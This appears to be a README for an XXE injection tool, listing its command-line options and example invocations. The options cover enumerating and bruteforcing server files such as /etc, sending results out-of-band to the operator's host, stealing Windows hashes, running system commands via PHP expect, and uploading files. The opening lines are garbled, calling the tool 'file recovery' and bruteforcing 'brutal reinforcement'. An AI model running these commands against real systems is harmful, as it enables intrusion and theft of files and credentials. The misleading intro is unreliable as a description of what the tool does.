## x20TEinjector


x20TEinjector automates file recovery using direct and out-of-band methods. Directory listing only works in Java applications. The brutal reinforcement method should be used for other applications.


## Options:<br />
```
  --host	    Mandatory - our IP address for reverse connections. (--host=192.168.0.2)
  --file	    Mandatory - file containing valid HTTP request with xml. You can also mark with "x20TEinjector" a point where DTD should be injected. (--file=/tmp/req.txt)
  --path	    Mandatory if enumerating directories - Path to enumerate. (--path=/etc)
  --brute	    Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)
  --logger	    Log results only. Do not send requests. HTTP logger looks for "p" parameter with results.
  
  --rhost	    Remote host's IP address or domain name. Use this argument only for requests without Host header. (--rhost=192.168.0.3)
  --rport	    Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)

  --oob		    Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)
  --direct	    Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)
  --cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique.
  --2ndfile	    File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)
  --phpfilter	Use PHP filter to base64 encode target file before sending.
  --netdoc      Use netdoc protocol instead of file (Java).
  --enumports	Enumerating unfiltered ports for reverse connection. Specify value "all" to enumerate all TCP ports. (--enumports=21,22,80,443,445)

  --hashes	    Steals Windows hash of the user that runs an application.
  --expect	    Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)
  --upload	    Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)
  --xslt	    Tests for XSLT injection.

  --ssl		    Use SSL.
  --proxy	    Proxy to use. (--proxy=127.0.0.1:8080)
  --httpport	Set custom HTTP port. (--httpport=80)
  --ftpport	    Set custom FTP port. (--ftpport=21)
  --gopherport	Set custom gopher port. (--gopherport=70)
  --jarport	    Set custom port for uploading files using jar. (--jarport=1337)
  --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)

  --test	    This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server.
  --urlencode	URL encode injected DTD. This is default for URI.
  --nodtd	    If you want to put DTD in request by yourself. Specify "--oob-xml" to show how DTD should look like.
  --output	    Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)
  --timeout	    Timeout for receiving file/directory content. (--timeout=20)
  --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)
  --fast	    Skip asking what to enumerate. Prone to false-positives.
  --verbose	    Show verbose messages.
```

## Example usage:<br />
```
  Enumerating /etc directory in HTTPS application:
  ruby x20TEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
  Enumerating /etc directory using gopher for OOB method:
  ruby x20TEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
  Second order exploitation:
  ruby x20TEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
  Bruteforcing files using HTTP out of band method and netdoc protocol:
  ruby x20TEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
  Enumerating using direct exploitation:
  ruby x20TEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND
  Enumerating unfiltered ports:
  ruby x20TEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
  Stealing Windows hashes:
  ruby x20TEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
  Uploading files using Java jar:
  ruby x20TEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
  Executing system commands using PHP expect:
  ruby x20TEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
  Testing for XSLT injection:
  ruby x20TEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
  Log requests only:
  ruby x20TEinjector.rb --logger --oob=http --output=/tmp/out.txt
```
